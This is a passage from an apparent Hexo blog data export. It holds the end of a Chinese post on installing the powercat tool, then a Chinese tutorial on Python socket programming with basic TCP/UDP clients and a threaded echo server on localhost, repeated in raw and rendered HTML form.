https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在powershell输入以下命令（注意要以管理员权限）：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>输入y即可，接着可以输入powercat -h测试是否安装成功</li>\n</ul>\n<h2 id=\"二、使用powercat\"><a href=\"#二、使用powercat\" class=\"headerlink\" title=\"二、使用powercat\"></a>二、使用powercat</h2><ul>\n<li>powercat -h 或 vim README.md查看帮助文件 </li>\n</ul>"},{"title":"python网络编程","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_16.jpg","top":false,"_content":"\n\n# python网络编程\n\n### 一、客户端\n\n#### TCP客户端\n\n<!--more-->\n\n```python\nimport socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.send(\"hello, world!\")\n\n# 接受数据\n# 最大接受1024字节数据\nresponse = client.recv(1024)\n\nprint(response)\n\n# 关闭套接字\nclient.close()\n```\n\n#### UDP客户端\n\n```python\nimport socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.sendto(\"hello, world!\", (host, port))\n\n# 接收数据\n# 最大接受1024字节数据\ndata, addr = client.recvfrom(1024)\n\nprint(data)\n\n# 关闭套接字\nclient.close()\n```\n\n### 二、服务器\n\n```python\nimport socket\nimport threading\n\n\n# bind_id留空的意思是本地IP 127.0.0.1\nbind_id = \"\"  \nbind_port = 9999\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind((bind_id, bind_port))\nserver.listen(5)\nprint('[*] Listening on {}:{}' .format(bind_id, bind_port))\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024)\n    print('[*] Received: {}' .format(request))\n    send_it = \"I love you\"\n    client_socket.send(send_it.encode())\n    client_socket.close()\n\n\nclient, address = server.accept()\nprint(\"[*] Accepted connection from: {}:{}\" .format(client, address))\nclient_handler_t1 = threading.Thread(target=handle_client, args=(client, ))\nclient_handler_t1.start()\n```\n\n### 实战演练\n\n#### 服务器（采取多线程）\n\n```python\nimport socket\nimport threading\n# from struct import pack\n\n\nclass ThreadSocket(object):\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((self.host, self.port))\n        # 超时收取，超过5秒没收到客户端回应自动断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack('QQ', 5, 0))\n        # 超时发送，超过5秒没将数据传送至客户端断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack('QQ', 4, 0))\n\n    def listen(self):\n        self.sock.listen(5)\n        '''\n        在这里插入对Ctrl+C的控制\n        '''\n        # 循环连接，可以与多个客户端依次链接\n        # while True:\n        client, address = self.sock.accept()\n        print('正在接收客户端信息...\\n')\n        # 超过30秒停止活动\n        # client.settimeout(15)\n        t1 = threading.Thread(target=self.handleClientRequest, args=(\n            client, address))\n        t1.start()\n\n    def handleClientRequest(self, client, address):\n        # 采取循环，使每次与客户端连接都可以进行多次对话\n        while True:\n            try:\n                data = client.recv(1024)\n                print('显示客户端信息：{}'.format(data))\n                if data:\n                    client.send(data)\n                else:\n                    print(\"Client has disconnected\")\n                    break\n            except:\n                client.close()\n\n\nif __name__ == '__main__':\n    server = ThreadSocket('', 9000)\n    server.listen()\n\n```\n\n\n\n#### 客户端\n\n```python\nimport socket\n\ntarget_host = '127.0.0.1'\ntarget_ip = 9000\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect((target_host, target_ip))\nsend_data = input('输入你想说的：')\nclient.send(send_data.encode())\nresponse = client.recv(4096)\n\nprint(response.decode() + 'love')\n```\n\n\n\n### 三、[socket常见选项之SO_REUSEADDR,SO_REUSEPORT](https://www.cnblogs.com/HKUI/p/11707170.html)\n\n- 使端口被释放后可以立即被使用\n","source":"_posts/python网络编程.md","raw":"---\ntitle: python网络编程\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_16.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: python\ntags: [python, 网络编程, 套接字]   # 可以是数组\ntop: false\n---\n\n\n# python网络编程\n\n### 一、客户端\n\n#### TCP客户端\n\n<!--more-->\n\n```python\nimport socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.send(\"hello, world!\")\n\n# 接受数据\n# 最大接受1024字节数据\nresponse = client.recv(1024)\n\nprint(response)\n\n# 关闭套接字\nclient.close()\n```\n\n#### UDP客户端\n\n```python\nimport socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.sendto(\"hello, world!\", (host, port))\n\n# 接收数据\n# 最大接受1024字节数据\ndata, addr = client.recvfrom(1024)\n\nprint(data)\n\n# 关闭套接字\nclient.close()\n```\n\n### 二、服务器\n\n```python\nimport socket\nimport threading\n\n\n# bind_id留空的意思是本地IP 127.0.0.1\nbind_id = \"\"  \nbind_port = 9999\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind((bind_id, bind_port))\nserver.listen(5)\nprint('[*] Listening on {}:{}' .format(bind_id, bind_port))\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024)\n    print('[*] Received: {}' .format(request))\n    send_it = \"I love you\"\n    client_socket.send(send_it.encode())\n    client_socket.close()\n\n\nclient, address = server.accept()\nprint(\"[*] Accepted connection from: {}:{}\" .format(client, address))\nclient_handler_t1 = threading.Thread(target=handle_client, args=(client, ))\nclient_handler_t1.start()\n```\n\n### 实战演练\n\n#### 服务器（采取多线程）\n\n```python\nimport socket\nimport threading\n# from struct import pack\n\n\nclass ThreadSocket(object):\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((self.host, self.port))\n        # 超时收取，超过5秒没收到客户端回应自动断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack('QQ', 5, 0))\n        # 超时发送，超过5秒没将数据传送至客户端断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack('QQ', 4, 0))\n\n    def listen(self):\n        self.sock.listen(5)\n        '''\n        在这里插入对Ctrl+C的控制\n        '''\n        # 循环连接，可以与多个客户端依次链接\n        # while True:\n        client, address = self.sock.accept()\n        print('正在接收客户端信息...\\n')\n        # 超过30秒停止活动\n        # client.settimeout(15)\n        t1 = threading.Thread(target=self.handleClientRequest, args=(\n            client, address))\n        t1.start()\n\n    def handleClientRequest(self, client, address):\n        # 采取循环，使每次与客户端连接都可以进行多次对话\n        while True:\n            try:\n                data = client.recv(1024)\n                print('显示客户端信息：{}'.format(data))\n                if data:\n                    client.send(data)\n                else:\n                    print(\"Client has disconnected\")\n                    break\n            except:\n                client.close()\n\n\nif __name__ == '__main__':\n    server = ThreadSocket('', 9000)\n    server.listen()\n\n```\n\n\n\n#### 客户端\n\n```python\nimport socket\n\ntarget_host = '127.0.0.1'\ntarget_ip = 9000\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect((target_host, target_ip))\nsend_data = input('输入你想说的：')\nclient.send(send_data.encode())\nresponse = client.recv(4096)\n\nprint(response.decode() + 'love')\n```\n\n\n\n### 三、[socket常见选项之SO_REUSEADDR,SO_REUSEPORT](https://www.cnblogs.com/HKUI/p/11707170.html)\n\n- 使端口被释放后可以立即被使用\n","slug":"python网络编程","published":1,"updated":"2021-06-20T03:06:45.308Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxv000i7vvt94u50vct","content":"<h1 id=\"python网络编程\"><a href=\"#python网络编程\" class=\"headerlink\" title=\"python网络编程\"></a>python网络编程</h1><h3 id=\"一、客户端\"><a href=\"#一、客户端\" class=\"headerlink\" title=\"一、客户端\"></a>一、客户端</h3><h4 id=\"TCP客户端\"><a href=\"#TCP客户端\" class=\"headerlink\" title=\"TCP客户端\"></a>TCP客户端</h4><span id=\"more\"></span>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 建立变量：目标主机和目标端口</span></span><br><span class=\"line\">host = ***</span><br><span class=\"line\">port = ***</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 建立一个socket对象</span></span><br><span class=\"line\">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 连接客户端</span></span><br><span class=\"line\"><span class=\"comment\"># connect内的是一个元组，代表的是一个具体的地址</span></span><br><span class=\"line\">client.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 发送数据</span></span><br><span class=\"line\">client.send(<span class=\"string\">&quot;hello, world!&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接受数据</span></span><br><span class=\"line\"><span class=\"comment\"># 最大接受1024字节数据</span></span><br><span class=\"line\">response = client.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(response)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭套接字</span></span><br><span class=\"line\">client.close()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"UDP客户端\"><a href=\"#UDP客户端\" class=\"headerlink\" title=\"UDP客户端\"></a>UDP客户端</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 建立变量：目标主机和目标端口</span></span><br><span class=\"line\">host = ***</span><br><span class=\"line\">port = ***</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 建立一个socket对象</span></span><br><span class=\"line\">client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 连接客户端</span></span><br><span class=\"line\"><span class=\"comment\"># connect内的是一个元组，代表的是一个具体的地址</span></span><br><span class=\"line\">client.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 发送数据</span></span><br><span class=\"line\">client.sendto(<span class=\"string\">&quot;hello, world!&quot;</span>, (host, port))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接收数据</span></span><br><span class=\"line\"><span class=\"comment\"># 最大接受1024字节数据</span></span><br><span class=\"line\">data, addr = client.recvfrom(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭套接字</span></span><br><span class=\"line\">client.close()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"二、服务器\"><a href=\"#二、服务器\" class=\"headerlink\" title=\"二、服务器\"></a>二、服务器</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># bind_id留空的意思是本地IP 127.0.0.1</span></span><br><span class=\"line\">bind_id = <span class=\"string\">&quot;&quot;</span>  </span><br><span class=\"line\">bind_port = <span class=\"number\">9999</span></span><br><span class=\"line\"></span><br><span class=\"line\">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">server.bind((bind_id, bind_port))</span><br><span class=\"line\">server.listen(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[*] Listening on &#123;&#125;:&#123;&#125;&#x27;</span> .<span class=\"built_in\">format</span>(bind_id, bind_port))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">handle_client</span>(<span class=\"params\">client_socket</span>):</span></span><br><span class=\"line\">    request = client_socket.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[*] Received: &#123;&#125;&#x27;</span> .<span class=\"built_in\">format</span>(request))</span><br><span class=\"line\">    send_it = <span class=\"string\">&quot;I love you&quot;</span></span><br><span class=\"line\">    client_socket.send(send_it.encode())</span><br><span class=\"line\">    client_socket.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">client, address = server.accept()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] Accepted connection from: &#123;&#125;:&#123;&#125;&quot;</span> .<span class=\"built_in\">format</span>(client, address))</span><br><span class=\"line\">client_handler_t1 = threading.Thread(target=handle_client, args=(client, ))</span><br><span class=\"line\">client_handler_t1.start()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实战演练\"><a href=\"#实战演练\" class=\"headerlink\" title=\"实战演练\"></a>实战演练</h3><h4 id=\"服务器（采取多线程）\"><a href=\"#服务器（采取多线程）\" class=\"headerlink\" title=\"服务器（采取多线程）\"></a>服务器（采取多线程）</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"comment\"># from struct import pack</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadSocket</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, host, port</span>):</span></span><br><span class=\"line\">        self.host = host</span><br><span class=\"line\">        self.port = port</span><br><span class=\"line\">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class=\"number\">1</span>)</span><br><span class=\"line\">        self.sock.bind((self.host, self.port))</span><br><span class=\"line\">        <span class=\"comment\"># 超时收取，超过5秒没收到客户端回应自动断开连接</span></span><br><span class=\"line\">        <span class=\"comment\"># self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack(&#x27;QQ&#x27;, 5, 0))</span></span><br><span class=\"line\">        <span class=\"comment\"># 超时发送，超过5秒没将数据传送至客户端断开连接</span></span><br><span class=\"line\">        <span class=\"comment\"># self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack(&#x27;QQ&#x27;, 4, 0))</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">listen</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        self.sock.listen(<span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        在这里插入对Ctrl+C的控制</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\"># 循环连接，可以与多个客户端依次链接</span></span><br><span class=\"line\">        <span class=\"comment\"># while True:</span></span><br><span class=\"line\">        client, address = self.sock.accept()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;正在接收客户端信息...\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 超过30秒停止活动</span></span><br><span class=\"line\">        <span class=\"comment\"># client.settimeout(15)</span></span><br><span class=\"line\">        t1 = threading.Thread(target=self.handleClientRequest, args=(</span><br><span class=\"line\">            client, address))</span><br><span class=\"line\">        t1.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">handleClientRequest</span>(<span class=\"params\">self, client, address</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># 采取循环，使每次与客户端连接都可以进行多次对话</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                data = client.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;显示客户端信息：&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(data))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> data:</span><br><span class=\"line\">                    client.send(data)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Client has disconnected&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                client.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    server = ThreadSocket(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"number\">9000</span>)</span><br><span class=\"line\">    server.listen()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\">target_host = <span class=\"string\">&#x27;127.0.0.1&#x27;</span></span><br><span class=\"line\">target_ip = <span class=\"number\">9000</span></span><br><span class=\"line\"></span><br><span class=\"line\">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">client.connect((target_host, target_ip))</span><br><span class=\"line\">send_data = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;输入你想说的：&#x27;</span>)</span><br><span class=\"line\">client.send(send_data.encode())</span><br><span class=\"line\">response = client.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.decode() + <span class=\"string\">&#x27;love&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT\"><a href=\"#三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT\" class=\"headerlink\" title=\"三、socket常见选项之SO_REUSEADDR,SO_REUSEPORT\"></a>三、<a href=\"https://www.cnblogs.com/HKUI/p/11707170.html\">socket常见选项之SO_REUSEADDR,SO_REUSEPORT</a></h3><ul>\n<li>使端口被释放后可以立即被使用</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"python网络编程\"><a href=\"#python网络编程\" class=\"headerlink\" title=\"python网络编程\"></a>python网络编程</h1><h3 id=\"一、客户端\"><a href=\"#一、客户端\" class=\"headerlink\" title=\"一、客户端\"></a>一、客户端</h3><h4 id=\"TCP客户端\"><a href=\"#TCP客户端\" class=\"headerlink\" title=\"TCP客户端\"></a>TCP客户端</h4>","more":"<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 建立变量：目标主机和目标端口</span></span><br><span class=\"line\">host = ***</span><br><span class=\"line\">port = ***</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 建立一个socket对象</span></span><br><span class=\"line\">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 连接客户端</span></span><br><span class=\"line\"><span class=\"comment\"># connect内的是一个元组，代表的是一个具体的地址</span></span><br><span class=\"line\">client.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 发送数据</span></span><br><span class=\"line\">client.send(<span class=\"string\">&quot;hello, world!&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接受数据</span></span><br><span class=\"line\"><span class=\"comment\"># 最大接受1024字节数据</span></span><br><span class=\"line\">response = client.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(response)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭套接字</span></span><br><span class=\"line\">client.close()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"UDP客户端\"><a href=\"#UDP客户端\" class=\"headerlink\" title=\"UDP客户端\"></a>UDP客户端</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 建立变量：目标主机和目标端口</span></span><br><span class=\"line\">host = ***</span><br><span class=\"line\">port = ***</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 建立一个socket对象</span></span><br><span class=\"line\">client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 连接客户端</span></span><br><span class=\"line\"><span class=\"comment\"># connect内的是一个元组，代表的是一个具体的地址</span></span><br><span class=\"line\">client.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 发送数据</span></span><br><span class=\"line\">client.sendto(<span class=\"string\">&quot;hello, world!&quot;</span>, (host, port))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接收数据</span></span><br><span class=\"line\"><span class=\"comment\"># 最大接受1024字节数据</span></span><br><span class=\"line\">data, addr = client.recvfrom(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭套接字</span></span><br><span class=\"line\">client.close()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"二、服务器\"><a href=\"#二、服务器\" class=\"headerlink\" title=\"二、服务器\"></a>二、服务器</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 